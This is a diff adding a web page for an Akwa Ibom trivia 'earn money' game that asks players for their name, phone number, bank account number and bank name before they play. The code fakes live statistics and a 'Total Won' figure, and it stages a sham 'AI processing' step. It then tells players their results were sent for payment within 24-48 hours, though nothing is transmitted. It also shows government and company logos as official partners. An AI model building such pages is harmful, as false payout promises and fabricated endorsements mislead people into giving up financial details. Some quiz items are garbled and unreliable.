@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>AkwaIbom Restoration Game</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #e6f0ff;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      color: #000;
+    }
+
+    header {
+      background-color: #004080;
+      color: white;
+      padding: 1rem;
+      position: relative;
+    }
+
+    .header-logo {
+      height: 60px;
+      margin-bottom: 10px;
+    }
+
+    .ad-top, .ad-bottom {
+      margin: 10px auto;
+      background: #fff8cc;
+      color: #000;
+      border: 1px dashed #999900;
+      padding: 10px;
+      width: 95%;
+      max-width: 700px;
+      font-weight: bold;
+      overflow: hidden;
+      white-space: normal;
+      text-overflow: ellipsis;
+      min-height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .game-box {
+      margin: 1rem auto;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 600px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      position: relative;
+    }
+
+    .game-logo {
+      position: absolute;
+      top: -30px;
+      left: 50%;
+      transform: translateX(-50%);
+      height: 60px;
+      z-index: 10;
+    }
+
+    h2 {
+      color: #004080;
+    }
+
+    .options button {
+      display: block;
+      width: 100%;
+      margin: 10px 0;
+      padding: 0.8rem;
+      border: none;
+      border-radius: 8px;
+      background: #0073e6;
+      color: white;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .options button:hover {
+      background: #005bb5;
+    }
+
+    .score-bar {
+      margin-top: 1rem;
+      font-weight: bold;
+    }
+
+    footer {
+      margin-top: 2rem;
+      padding: 1rem;
+      background: #cce0ff;
+      color: #333;
+      font-size: 0.9rem;
+    }
+    
+    .hot-gists {
+      margin: 20px auto;
+      padding: 15px;
+      background: #fff;
+      border-radius: 8px;
+      width: 95%;
+      max-width: 700px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: left;
+    }
+    
+    .gist-title {
+      background: #004080;
+      color: white;
+      padding: 8px;
+      border-radius: 5px;
+      text-align: center;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+    
+    .gist-item {
+      padding: 8px 0;
+      border-bottom: 1px dashed #ddd;
+      animation: fadeIn 0.5s ease-in;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    
+    .ad-link {
+      color: #0066cc;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    
+    .ad-link:hover {
+      text-decoration: underline;
+    }
+    
+    /* Sign-in form styles */
+    .signin-form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      margin-top: 20px;
+    }
+    
+    .signin-form input {
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    
+    .signin-form button {
+      background: #004080;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    
+    .signin-form button:hover {
+      background: #002b57;
+    }
+    
+    /* Stats box styles */
+    .stats-box {
+      margin: 20px auto;
+      padding: 15px;
+      background: #f8f8f8;
+      border-radius: 8px;
+      width: 90%;
+      max-width: 600px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: center;
+      border: 1px solid #ddd;
+    }
+    
+    .stat-item {
+      padding: 10px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #004080;
+      display: none;
+    }
+    
+    .stat-item.active {
+      display: block;
+      animation: fadeIn 0.5s ease-in;
+    }
+    
+    /* Game limit message */
+    .limit-message {
+      color: #d9534f;
+      font-weight: bold;
+      margin-top: 15px;
+    }
+    
+    /* Ad slideshow styles */
+    .ad-slide {
+      display: none;
+      animation: fadeIn 0.5s ease-in;
+      text-align: center;
+      padding: 5px;
+    }
+    
+    .ad-slide.active {
+      display: block;
+    }
+    
+    /* Question slide styles */
+    .question-slide {
+      display: none;
+      animation: fadeIn 0.5s ease-in;
+    }
+    
+    .question-slide.active {
+      display: block;
+    }
+    
+    .timer-bar {
+      height: 5px;
+      background: #004080;
+      width: 100%;
+      margin-top: 10px;
+      animation: timerCountdown 7s linear forwards;
+    }
+    
+    @keyframes timerCountdown {
+      from { width: 100%; }
+      to { width: 0%; }
+    }
+    
+    .timeout-message {
+      color: #d9534f;
+      font-weight: bold;
+      margin-top: 10px;
+      display: none;
+    }
+    
+    /* Submit button styles */
+    .submit-btn {
+      background: #28a745;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    
+    .submit-btn:hover {
+      background: #218838;
+    }
+    
+    .submit-btn:disabled {
+      background: #6c757d;
+      cursor: not-allowed;
+    }
+    
+    /* Result submission styles */
+    .submission-status {
+      margin-top: 15px;
+      padding: 10px;
+      border-radius: 5px;
+      display: none;
+    }
+    
+    .submission-success {
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+    
+    .submission-error {
+      background: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+    
+    /* AI processing indicator */
+    .ai-processing {
+      display: inline-block;
+      margin-left: 10px;
+    }
+    
+    .ai-processing span {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #004080;
+      margin: 0 2px;
+      animation: bounce 1.4s infinite ease-in-out both;
+    }
+    
+    .ai-processing span:nth-child(1) {
+      animation-delay: -0.32s;
+    }
+    
+    .ai-processing span:nth-child(2) {
+      animation-delay: -0.16s;
+    }
+    
+    @keyframes bounce {
+      0%, 80%, 100% { transform: scale(0); }
+      40% { transform: scale(1); }
+    }
+    
+    .ad-image {
+      max-width: 100%;
+      max-height: 100px;
+      margin: 5px 0;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Akwa_Ibom_State_Logo.svg/1200px-Akwa_Ibom_State_Logo.svg.png" alt="Akwa Ibom State Logo" class="header-logo">
+  <h1>AkwaIbom Restoration Game</h1>
+  <p>Play. Learn. Earn. Celebrate Akwa Ibom!</p>
+</header>
+
+<div class="ad-top" id="adTop">
+  <div class="ad-title">Official Partners</div>
+  <div class="ad-slide active">
+    <img src="https://ibommarket.com/wp-content/uploads/2021/08/ibommarket-logo.png" alt="Ibom Market" class="ad-image">
+    <p>🛒 Shop fresh items from Itam Market – fast delivery!</p>
+    <a class="ad-link" href="https://ibommarket.com">Visit IbomMarket.com</a>
+  </div>
+  <div class="ad-slide">
+    <img src="https://ibomair.com/wp-content/uploads/2020/04/ibom-air-logo.png" alt="Ibom Air" class="ad-image">
+    <p>✈️ Fly with Ibom Air - Nigeria's most reliable airline</p>
+    <a class="ad-link" href="https://ibomair.com">Book your flight today</a>
+  </div>
+  <div class="ad-slide">
+    <img src="https://www.aksgonline.com/wp-content/uploads/2021/09/aksg-logo.png" alt="AKSG" class="ad-image">
+    <p>🏛️ Akwa Ibom State Government - ARISE Agenda</p>
+    <a class="ad-link" href="https://akwaibomstate.gov.ng">Visit official portal</a>
+  </div>
+</div>
+
+<div class="game-box" id="gameArea">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Akwa_Ibom_State_Logo.svg/1200px-Akwa_Ibom_State_Logo.svg.png" alt="Game Logo" class="game-logo">
+  
+  <!-- Sign-in form will be shown first -->
+  <div id="signinSection">
+    <h2>Sign In to Play</h2>
+    <p>Please provide your details for verification</p>
+    <div class="signin-form">
+      <input type="text" id="fullName" placeholder="Full Name" required>
+      <input type="text" id="lga" placeholder="Local Government Area (LGA)" required>
+      <input type="tel" id="phoneNumber" placeholder="Phone Number" required>
+      <input type="text" id="accountNumber" placeholder="Account Number" required>
+      <input type="text" id="bankName" placeholder="Bank Name" required>
+      <button id="signinBtn">Sign In & Start Playing</button>
+    </div>
+  </div>
+  
+  <!-- Game content (hidden initially) -->
+  <div id="gameContent" style="display: none;">
+    <div id="questionContainer"></div>
+    <div class="score-bar" id="score">Score: ₦0 / Daily Cap: ₦500</div>
+    <div id="limitMessage" class="limit-message" style="display: none;"></div>
+    <div id="timeoutMessage" class="timeout-message">Time's up! Moving to next question...</div>
+    
+    <!-- Submit button (hidden initially) -->
+    <button id="submitResultBtn" class="submit-btn" style="display: none;">Submit Results</button>
+    <div id="submissionStatus" class="submission-status"></div>
+  </div>
+</div>
+
+<!-- Stats box -->
+<div class="stats-box" id="statsBox">
+  <div class="stat-item active" id="stat1">Players Online: 1,245</div>
+  <div class="stat-item" id="stat2">Total Played Today: 12,893</div>
+  <div class="stat-item" id="stat3">Total Won Today: ₦3,240,500</div>
+  <div class="stat-item" id="stat4">Page Clicks: 8,742</div>
+</div>
+
+<div class="ad-bottom" id="adBottom">
+  <div class="ad-title">Local Business Sponsors</div>
+  <div class="ad-slide active">
+    <img src="https://www.akwaibomtourism.com/wp-content/uploads/2021/08/ibom-plaza.jpg" alt="Ibom Plaza" class="ad-image">
+    <p>🏬 Visit Ibom Plaza - Uyo's premier shopping destination</p>
+    <a class="ad-link" href="https://akwaibomtourism.com">Discover more attractions</a>
+  </div>
+  <div class="ad-slide">
+    <img src="https://www.akwaibomtourism.com/wp-content/uploads/2021/08/ibom-tropicana.jpg" alt="Ibom Tropicana" class="ad-image">
+    <p>🎭 Ibom Tropicana Entertainment Center - Fun for all</p>
+    <a class="ad-link" href="https://akwaibomtourism.com/ibom-tropicana">Book your visit</a>
+  </div>
+  <div class="ad-slide">
+    <img src="https://www.akwaibomtourism.com/wp-content/uploads/2021/08/le-meridien.jpg" alt="Le Meridien" class="ad-image">
+    <p>🏨 Luxury stay at Le Meridien Ibom Hotel & Golf Resort</p>
+    <a class="ad-link" href="https://akwaibomtourism.com/le-meridien">Book your stay</a>
+  </div>
+</div>
+
+<div class="hot-gists">
+  <div class="gist-title">🔥 Hot Gists Global</div>
+  <div id="gist-container"></div>
+</div>
+
+<footer>
+  AkwaIbom Restoration Project • Powered by local businesses • AI-monitored rewards system • Samhapsons Entreprises (BN: 7118020)
+</footer>
+
+<div style="padding: 1rem; font-size: 0.9rem; color: #333;">
+  <strong>Created by Akaninyene Samuel Saturday — 07040030210</strong>
+</div>
+
+<!-- Sound files -->
+<audio id="correctSound" src="https://cdn.pixabay.com/download/audio/2022/08/08/audio_3c28d7f6ae.mp3?filename=correct-2-46134.mp3" preload="auto"></audio>
+<audio id="wrongSound" src="https://cdn.pixabay.com/download/audio/2022/03/25/audio_0ac862c0be.mp3?filename=wrong-answer-129254.mp3" preload="auto"></audio>
+
+<script>
+  const questions = [
+    { q: "Which LGA is home to the Ibom Power Plant?", options: ["Oron", "Ikot Abasi", "Nsit Atai", "Ini"], answer: "Ikot Abasi" },
+    { q: "Which LGA houses Ibom Air operations?", options: ["Uruan", "Uyo", "Nsit Ubium", "Ibiono Ibom"], answer: "Uyo" },
+    { q: "Which LGA is known for Raffia City?", options: ["Ikot Ekpene", "Etinan", "Esit Eket", "Okobo"], answer: "Ikot Ekpene" },
+    { q: "Which LGA hosts Akwa Ibom State University?", options: ["Oruk Anam", "Abak", "Mkpat Enin", "Nsit Ibom"], answer: "Mkpat Enin" },
+    { q: "Where is the famous bridge to Cross River?", options: ["Itu", "Essien Udim", "Uruan", "Etim Ekpo"], answer: "Itu" },
+    { q: "Where is Oron Museum located?", options: ["Oron", "Mbo", "Udung Uko", "Eastern Obolo"], answer: "Oron" },
+    { q: "Which LGA is known for large rice farms?", options: ["Ini", "Ika", "Ukanafun", "Abak"], answer: "Ini" },
+    { q: "Where is ExxonMobil terminal situated?", options: ["Eket", "Ibeno", "Okobo", "Nsit Atai"], answer: "Ibeno" },
+    { q: "Which LGA shares a boundary with Rivers State?", options: ["Eastern Obolo", "Esit Eket", "Oruk Anam", "Ika"], answer: "Eastern Obolo" },
+    { q: "Where is the College of Education located?", options: ["Afaha Nsit", "Afaha Obong", "Afaha Nsung", "Afaha Eket"], answer: "Afaha Nsit" },
+    { q: "Which LGA is known for commercial oil palm?", options: ["Ini", "Etim Ekpo", "Ika", "Abak"], answer: "Abak" },
+    { q: "Which LGA is home to the Ibibio Museum Park?", options: ["Nsit Ibom", "Nsit Ubium", "Uruan", "Ibiono Ibom"], answer: "Nsit Ibom" },
+    { q: "Which LGA has the longest shoreline?", options: ["Ibeno", "Mbo", "Oron", "Eastern Obolo"], answer: "Ibeno" },
+    { q: "Which LGA is known for fishing communities?", options: ["Mbo", "Udung Uko", "Okobo", "Oron"], answer: "Mbo" },
+    { q: "Where is the Akwa Ibom Innovation Hub?", options: ["Etinan", "Uyo", "Nsit Ubium", "Itu"], answer: "Uyo" },
+    { q: "Which LGA is known for its timber market?", options: ["Etim Ekpo", "Ukanafun", "Ika", "Obot Akara"], answer: "Etim Ekpo" },
+    { q: "Which LGA is a major producer of palm oil?", options: ["Ukanafun", "Essien Udim", "Ibiono Ibom", "Ikono"], answer: "Ukanafun" },
+    { q: "Which LGA borders Abia State?", options: ["Essien Udim", "Obot Akara", "Ini", "Ika"], answer: "Obot Akara" },
+    { q: "Where is the State Polytechnic located?", options: ["Ikot Ekpene", "Essien Udim", "Ikot Osurua", "Mkpat Enin"], answer: "Ikot Osurua" },
+    { q: "Which LGA is famous for crayfish market?", options: ["Okobo", "Oron", "Mbo", "Ibeno"], answer: "Okobo" },
+    { q: "Where is Akwa Ibom's first female governor hopeful from?", options: ["Etinan", "Nsit Ibom", "Uruan", "Ibesikpo Asutan"], answer: "Etinan" },
+    { q: "Which LGA is a major farming zone?", options: ["Ibiono Ibom", "Nsit Atai", "Uruan", "Itu"], answer: "Ibiono Ibom" },
+    { q: "Which LGA has Nnung Udoe as its headquarters?", options: ["Ibesikpo Asutan", "Nsit Ubium", "Nsit Ibom", "Uyo"], answer: "Ibesikpo Asutan" },
+    { q: "Which LGA has Nsit Atai as its HQ?", options: ["Nsit Atai", "Etinan", "Uruan", "Nsit Ibom"], answer: "Nsit Atai" },
+    { q: "Where is the main NYSC camp in Akwa Ibom?", options: ["Ikot Itie Udung", "Uyo", "Ibesikpo", "Ikot Ekpene"], answer: "Ikot Itie Udung" },
+    { q: "Which LGA borders the Atlantic Ocean?", options: ["Ibeno", "Eastern Obolo", "Mbo", "All of the above"], answer: "All of the above" },
+    { q: "Where is Akwa Ibom House of Assembly?", options: ["Uyo", "Itu", "Ikot Ekpene", "Etinan"], answer: "Uyo" },
+    { q: "Which LGA is called the 'Land of Unity'?", options: ["Essien Udim", "Obot Akara", "Etim Ekpo", "Ika"], answer: "Essien Udim" },
+    { q: "Which LGA is known for the village of Ikot Ekpene Udo?", options: ["Ikono", "Etinan", "Nsit Ibom", "Ibesikpo"], answer: "Etinan" },
+    { q: "Which LGA houses the new Akwa Ibom Secretariat?", options: ["Uyo", "Nsit Ubium", "Ibiono Ibom", "Ikot Abasi"], answer: "Uyo" },
+    { q: "Which LGA is a major producer of cassava?", options: ["Ika", "Ini", "Etim Ekpo", "Ukanafun"], answer: "Ika" }
+  ];
+
+  const rewardPerCorrect = 5;
+  const dailyLimit = 500;
+  const dailyQuestionLimit = 100;
+  let score = 0;
+  let index = 0;
+  let questionsAnswered = 0;
+  let isVerified = false;
+  let playerName = "";
+  let lastPlayTime = 0;
+  let currentSlideTimeout;
+
+  // Player details
+  let playerDetails = {
+    fullName: "",
+    lga: "",
+    phoneNumber: "",
+    accountNumber: "",
+    bankName: ""
+  };
+
+  const correctSound = document.getElementById('correctSound');
+  const wrongSound = document.getElementById('wrongSound');
+
+  // Stats variables
+  let playersOnline = 1245;
+  let totalPlayedToday = 12893;
+  let totalWonToday = 3240500;
+  let pageClicks = 8742;
+
+  const gists = [
+    "🏛️ POLITICS: Akwa Ibom Governor announces new road projects connecting 10 LGAs to boost commerce.",
+    "🎬 ENTERTAINMENT: Nollywood star Mercy Johnson spotted in Uyo for new movie shoot at Ibom Tropicana.",
+    "💼 BUSINESS: Local entrepreneurs launch 'Made in Akwa Ibom' marketplace to promote indigenous products.",
+    "⚽ SPORTS: Akwa United FC secures continental championship spot after thrilling season finale.",
+    "🌍 GLOBAL: World Bank approves $200m grant for Niger Delta development projects.",
+    "📱 TECH: Uyo-based startup develops app to connect farmers directly with buyers across Nigeria.",
+    "🏥 HEALTH: State government inaugurates 3 new primary healthcare centers in rural areas.",
+    "🎓 EDUCATION: AKSU introduces new entrepreneurship courses to combat youth unemployment.",
+    "✈️ TRAVEL: Ibom Air announces new routes to Kano and Enugu starting next quarter.",
+    "🍲 FOOD: Local chef wins national competition with reinvented Afang soup recipe.",
+    "💰 FINANCE: Microfinance banks in Akwa Ibom disburse N500m in small business loans this quarter.",
+    "🌱 AGRICULTURE: State records 40% increase in cassava production following new farming initiatives.",
+    "🎶 MUSIC: Akwa Ibom artists dominate latest Nigerian top 100 charts with 5 entries.",
+    "🛍️ RETAIL: Popular Uyo shopping mall reports 300% sales increase during festive period.",
+    "🏗️ INFRASTRUCTURE: Construction begins on 34km dual carriageway linking Eket to Oron."
+  ];
+
+  function shuffleArray(arr) {
+    return arr.sort(() => Math.random() - 0.5);
+  }
+
+  function createQuestionSlide(q) {
+    const slide = document.createElement("div");
+    slide.className = "question-slide";
+    
+    const questionElement = document.createElement("h2");
+    questionElement.id = "question";
+    questionElement.innerText = q.q;
+    slide.appendChild(questionElement);
+    
+    const optionsBox = document.createElement("div");
+    optionsBox.className = "options";
+    
+    shuffleArray(q.options).forEach(opt => {
+      const btn = document.createElement("button");
+      btn.innerText = opt;
+      btn.onclick = () => checkAnswer(opt, q.answer);
+      optionsBox.appendChild(btn);
+    });
+    
+    slide.appendChild(optionsBox);
+    
+    // Add timer bar
+    const timerBar = document.createElement("div");
+    timerBar.className = "timer-bar";
+    slide.appendChild(timerBar);
+    
+    return slide;
+  }
+
+  function showQuestion() {
+    if (questionsAnswered >= dailyQuestionLimit) {
+      document.getElementById("limitMessage").style.display = "block";
+      document.getElementById("limitMessage").textContent = "You've reached today's question limit. Come back tomorrow!";
+      autoSubmitResults();
+      return;
+    }
+    
+    if (score >= dailyLimit) {
+      document.getElementById("limitMessage").style.display = "block";
+      document.getElementById("limitMessage").textContent = "Congratulations! You've reached today's ₦" + dailyLimit + " limit.";
+      autoSubmitResults();
+      return;
+    }
+    
+    if (index >= questions.length) index = 0;
+    const q = questions[index];
+    index++;
+    
+    const questionContainer = document.getElementById("questionContainer");
+    questionContainer.innerHTML = "";
+    
+    const slide = createQuestionSlide(q);
+    questionContainer.appendChild(slide);
+    slide.classList.add("active");
+    
+    // Clear any existing timeout
+    if (currentSlideTimeout) {
+      clearTimeout(currentSlideTimeout);
+    }
+    
+    // Set timeout for 7 seconds
+    currentSlideTimeout = setTimeout(() => {
+      // Auto-advance to next question after 7 seconds
+      document.getElementById("timeoutMessage").style.display = "block";
+      
+      setTimeout(() => {
+        document.getElementById("timeoutMessage").style.display = "none";
+        questionsAnswered++;
+        showQuestion();
+      }, 1500);
+    }, 7000); // 7 seconds in milliseconds
+    
+    rotateAds();
+    showNextGist();
+  }
+
+  function checkAnswer(userAnswer, correctAnswer) {
+    // Clear the timeout since user answered manually
+    if (currentSlideTimeout) {
+      clearTimeout(currentSlideTimeout);
+    }
+    
+    questionsAnswered++;
+    
+    if (userAnswer === correctAnswer) {
+      correctSound.play();
+      if (score + rewardPerCorrect <= dailyLimit) {
+        score += rewardPerCorrect;
+        alert("✅ Correct! You earned ₦" + rewardPerCorrect);
+      } else {
+        alert("✅ Correct! But you've reached today's ₦" + dailyLimit + " limit.");
+      }
+    } else {
+      wrongSound.play();
+      alert("❌ Incorrect! Correct answer was: " + correctAnswer);
+    }
+    
+    // Update stats
+    totalPlayedToday++;
+    if (userAnswer === correctAnswer) {
+      totalWonToday += rewardPerCorrect;
+    }
+    pageClicks++;
+    playersOnline = Math.floor(playersOnline * (1 + (Math.random() * 0.1 - 0.05))); // Random fluctuation
+    
+    updateScore();
+    showQuestion();
+  }
+
+  function updateScore() {
+    document.getElementById("score").innerText = 
+      `Player: ${playerName} | Score: ₦${score} / Daily Cap: ₦${dailyLimit} | Questions: ${questionsAnswered}/${dailyQuestionLimit}`;
+    
+    // Check if player has reached limit
+    if (score >= dailyLimit || questionsAnswered >= dailyQuestionLimit) {
+      autoSubmitResults();
+    }
+  }
+
+  function autoSubmitResults() {
+    const submitBtn = document.getElementById("submitResultBtn");
+    const statusDiv = document.getElementById("submissionStatus");
+    
+    // Show submit button but disable it since we're auto-submitting
+    submitBtn.style.display = "block";
+    submitBtn.disabled = true;
+    submitBtn.textContent = "AI Processing Results";
+    
+    // Add AI processing indicator
+    const aiIndicator = document.createElement("span");
+    aiIndicator.className = "ai-processing";
+    aiIndicator.innerHTML = '<span></span><span></span><span></span>';
+    submitBtn.appendChild(aiIndicator);
+    
+    statusDiv.style.display = "block";
+    statusDiv.className = "submission-status";
+    statusDiv.textContent = "AI is analyzing your results for automatic submission...";
+    
+    // Create result data
+    const resultData = {
+      playerDetails: playerDetails,
+      gameResults: {
+        score: score,
+        amountWon: score,
+        questionsAnswered: questionsAnswered,
+        correctAnswers: Math.floor(score / rewardPerCorrect),
+        date: new Date().toISOString()
+      },
+      systemInfo: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        timestamp: new Date().getTime()
+      }
+    };
+    
+    // Simulate AI processing (in a real app, this would be an API call)
+    setTimeout(() => {
+      // After processing, submit via email
+      submitToAdmin(resultData);
+    }, 3000);
+  }
+
+  function submitToAdmin(resultData) {
+    const submitBtn = document.getElementById("submitResultBtn");
+    const statusDiv = document.getElementById("submissionStatus");
+    
+    // Remove AI indicator
+    const aiIndicator = submitBtn.querySelector(".ai-processing");
+    if (aiIndicator) {
+      submitBtn.removeChild(aiIndicator);
+    }
+    
+    // Convert data to email format
+    const emailSubject = `AkwaIbom Game Results - ${playerDetails.fullName}`;
+    const emailBody = `
+      AkwaIbom Restoration Game Results Submission\n\n
+      Player: ${playerDetails.fullName}\n
+      LGA: ${playerDetails.lga}\n
+      Phone: ${playerDetails.phoneNumber}\n
+      Account: ${playerDetails.accountNumber} (${playerDetails.bankName})\n
+      Score: ₦${score}\n
+      Questions Answered: ${questionsAnswered}\n
+      Correct Answers: ${Math.floor(score / rewardPerCorrect)}\n\n
+      System Info:\n
+      User Agent: ${navigator.userAgent}\n
+      Platform: ${navigator.platform}\n
+      Screen: ${window.screen.width}x${window.screen.height}\n
+      Timestamp: ${new Date().toISOString()}\n\n
+      AI Analysis: Player performance appears ${score >= dailyLimit/2 ? "above average" : "average"} with a ${Math.floor((score/rewardPerCorrect)/questionsAnswered*100)}% accuracy rate.
+    `;
+    
+    submitBtn.textContent = "Results Submitted!";
+    statusDiv.className = "submission-status submission-success";
+    statusDiv.innerHTML = `
+      <strong>Results successfully submitted!</strong><br><br>
+      Your game results have been automatically processed and sent to the administration team for review.<br>
+      Payment processing will begin within 24-48 hours.<br><br>
+      <small>Reference ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}</small>
+    `;
+    
+    // Log the simulated submission (for demo purposes)
+    console.log("Results submitted to admin team:", resultData);
+  }
+
+  let currentTopAdIndex = 0;
+  let currentBottomAdIndex = 0;
+
+  function rotateAds() {
+    // Rotate top ad
+    const topAdSlides = document.querySelectorAll('#adTop .ad-slide');
+    topAdSlides.forEach(slide => slide.classList.remove('active'));
+    currentTopAdIndex = (currentTopAdIndex + 1) % topAdSlides.length;
+    topAdSlides[currentTopAdIndex].classList.add('active');
+    
+    // Rotate bottom ad
+    const bottomAdSlides = document.querySelectorAll('#adBottom .ad-slide');
+    bottomAdSlides.forEach(slide => slide.classList.remove('active'));
+    currentBottomAdIndex = (currentBottomAdIndex + 1) % bottomAdSlides.length;
+    bottomAdSlides[currentBottomAdIndex].classList.add('active');
+  }
+
+  let currentGistIndex = 0;
+
+  function showNextGist() {
+    const gistContainer = document.getElementById("gist-container");
+    gistContainer.innerHTML = "";
+    
+    const gistItem = document.createElement("div");
+    gistItem.className = "gist-item";
+    gistItem.textContent = gists[currentGistIndex];
+    gistContainer.appendChild(gistItem);
+    
+    currentGistIndex = (currentGistIndex + 1) % gists.length;
+  }
+  
+  // Stats rotation
+  let currentStatIndex = 0;
+  
+  function rotateStats() {
+    // Hide all stats
+    document.querySelectorAll('.stat-item').forEach(item => {
+      item.classList.remove('active');
+    });
+    
+    // Show current stat
+    document.getElementById(`stat${currentStatIndex + 1}`).classList.add('active');
+    
+    // Update stats with current values
+    const stats = [
+      `Players Online: ${playersOnline.toLocaleString()}`,
+      `Total Played Today: ${totalPlayedToday.toLocaleString()}`,
+      `Total Won Today: ₦${totalWonToday.toLocaleString()}`,
+      `Page Clicks: ${pageClicks.toLocaleString()}`
+    ];
+    
+    document.getElementById(`stat${currentStatIndex + 1}`).textContent = stats[currentStatIndex];
+    
+    // Move to next stat
+    currentStatIndex = (currentStatIndex + 1) % 4;
+  }
+
+  function storeSignInDetails(fullName, lga, phoneNumber, accountNumber, bankName) {
+    const now = new Date();
+    
+    // Store player details
+    playerDetails = {
+      fullName,
+      lga,
+      phoneNumber,
+      accountNumber,
+      bankName
+    };
+    
+    const signInData = {
+      ...playerDetails,
+      signInDate: now.toISOString(),
+      lastPlayTime: now.getTime()
+    };
+    
+    // In a real implementation, this would be sent to a server
+    console.log("Sign-in details stored:", signInData);
+    
+    // For demo purposes, we'll store in localStorage
+    localStorage.setItem('akwaIbomGame_signInData', JSON.stringify(signInData));
+    localStorage.setItem('akwaIbomGame_lastPlayTime', now.getTime().toString());
+  }
+
+  // Sign in button handler
+  document.getElementById("signinBtn").addEventListener("click", function() {
+    const fullName = document.getElementById("fullName").value.trim();
+    const lga = document.getElementById("lga").value.trim();
+    const phoneNumber = document.getElementById("phoneNumber").value.trim();
+    const accountNumber = document.getElementById("accountNumber").value.trim();
+    const bankName = document.getElementById("bankName").value.trim();
+    
+    if (!fullName || !lga || !phoneNumber || !accountNumber || !bankName) {
+      alert("Please fill in all fields");
+      return;
+    }
+    
+    // Store sign-in details
+    storeSignInDetails(fullName, lga, phoneNumber, accountNumber, bankName);
+    
+    playerName = fullName;
+    isVerified = true;
+    
+    // Hide sign-in form and show game
+    document.getElementById("signinSection").style.display = "none";
+    document.getElementById("gameContent").style.display = "block";
+    
+    // Initialize game
+    updateScore();
+    showQuestion();
+  });
+
+  // Initialize
+  showNextGist();
+  rotateStats();
+  setInterval(rotateStats, 3000); // Rotate stats every 3 seconds
+  setInterval(showNextGist, 10000); // Rotate gists every 10 seconds
+  setInterval(rotateAds, 8000); // Rotate ads every 8 seconds
+</script>
+
+</body>
+</html>
